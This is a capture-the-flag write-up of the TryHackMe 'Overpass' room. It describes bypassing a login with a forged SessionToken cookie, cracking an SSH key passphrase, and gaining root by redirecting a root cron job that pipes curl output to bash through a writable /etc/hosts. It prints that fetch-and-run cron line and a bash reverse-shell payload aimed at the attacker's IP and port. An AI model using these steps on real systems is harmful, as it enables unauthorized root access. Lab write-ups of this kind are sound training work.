# 1 Overpass

## Boot to Root

**Room Name: Overpass**

**Difficulty: easy**

**Date Completed:** 29 December 2025

**Platform:** TryHackMe

## Summary

A website is running and its not followed best Practices

## Tools Used

- nmap
- gobuster
- john

## Reconnaissance

*Initial information gathering and scanning*

Two Ports Opens: ssh and http

![image.png](image.png)

## Enumeration

*Detailed enumeration of services, directories, or vulnerabilities found*

1. ***Gobuster result***

![image.png](image%201.png)

1. ***Read Login functionality*** 

The page contained a JS script called **login.js**. :
Inspecting the code, it was observed that the script was checking for a response when the page was loaded, and if the response did not contained the string **“Incorrect Credentials”**, it would create a cookie called **“SessionToken”** with the response. However, the value of the response was not specified to create the cookie.

## Exploitation

*Steps taken to exploit identified vulnerabilities*

**3. *Initial Foothold — Broken Authentication and Sensitive Information Exposure***

**Vulnerability Explanation:** The /admin page contained a JS script login.js that exposed the authentication mechanism it used to allow a user to login. It would first check if the response contained the string “Incorrect Credentials” when the page was loaded, and if not, it would set the cookie value of SessionToken with the response. This allows an attacker to create a cookie called SessionToken with any random value other than “Incorrect Credentials” to bypass the authentication mechanism. This lead to the discovery of a username and a SSH private key which led to the initial foothold on the target.

**Vulnerability Fix:** Review the source code of login.js and do not expose the authentication at the front-end.

**Severity: Critical**

**Steps to reproduce the attack:**

Click on the storage tab on the developer tools pane, select the url under the cookie menu on the left. Click on the plus sign to add a new cookie.

Change the name to **SessionToken** and the value to any random value other than “Incorrect Credentials”.

Refresh the page at **/admin** to bypass the authentication mechanism. The page contained inofrmation regarding the a username: james, his rsa private key for ssh and that the passphrase could be cracked.

![image.png](image%202.png)

1. Copied that private key → rsa_key → ssh2john → get passphrase 
2. Login as james

## Post-Exploitation

*Any privilege escalation or additional access obtained*

The target was found to be running a cron job as the root user. The script that was run every minute was **buildscript.sh** which was obtained via a web request from **overpass.thm and** piped to **bash.**

*james@overpass-prod:~$ cat /etc/crontab*

** * * * root curl overpass.thm/downloads/src/buildscript.sh | bash*

As the **cronjob** involved making a web request to the domain, **overpass.thm**, the /etc/hosts file was checked to see if it was writable by the current user. And it is.

**Vulnerability Explanation:** The target was running a cron job which involved a curl request and the response was piped to bash. The /etc/hosts file had the write permission enabled for all users. This allows a user without admin rights to edit the /etc/hosts file and execute arbitrary code on the target.

**Vulnerability Fix:** Only allow the root user to write to the /etc/hosts file.

**Severity: Critical**

**Now how to get root shell**

1. changed /etc/hosts to my IP for overpass.thm
2. created a file inside folder /downloads/src/buildscripts.sh 
3. File contains paylod: bash -i >& /dev/tcp/IP/PORT 0>&1
4. Give permission to execute
5. Started a python server
6. started also nc server to get reverse shell
7. Got it

## Lessons Learned

*Key takeaways and new techniques learned*

1. Check each and every part of application
2. Its logic, directories
3. about cronjobs
4. working /etc/hosts
5. Reverse Shell payload

## References

[Room Link](https://tryhackme.com/room/overpass?utm_campaign=social_share&utm_medium=social&utm_content=share-completed-room&utm_source=copy&sharerId=687fbe16c0f31ee1c196cd9a)